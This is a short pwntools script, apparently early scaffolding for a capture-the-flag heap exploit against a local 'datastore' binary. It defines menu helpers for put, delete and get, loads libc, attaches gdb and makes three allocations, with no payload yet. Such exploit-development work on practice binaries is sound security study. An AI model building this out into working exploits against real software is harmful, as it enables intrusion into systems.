# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')

p = process("./datastore")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def cmd(command_num):
    p.recvuntil('command:')
    p.sendline(str(command_num))

def put(key, size, data):
    cmd('PUT')
    p.recvuntil('key:')
    p.sendline(str(key))
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('data:')
    if len(data) < size:
        p.send(data.ljust(size, '\x00'))
    else:
        p.send(data)

def delete(key):
    cmd('DEL')
    p.recvuntil('key:')
    p.sendline(key)

def get(key):
    cmd('GET')
    p.recvuntil('key:')
    p.sendline(key)
    p.recvuntil('[')
    num = int(p.recvuntil(' bytes').strip(' bytes'))
    p.recvuntil(':\n')
    return p.recv(num)

gdb.attach(p)

put(1,10,"a")
put(2,10,"a")
put(3,10,"a")


p.interactive()



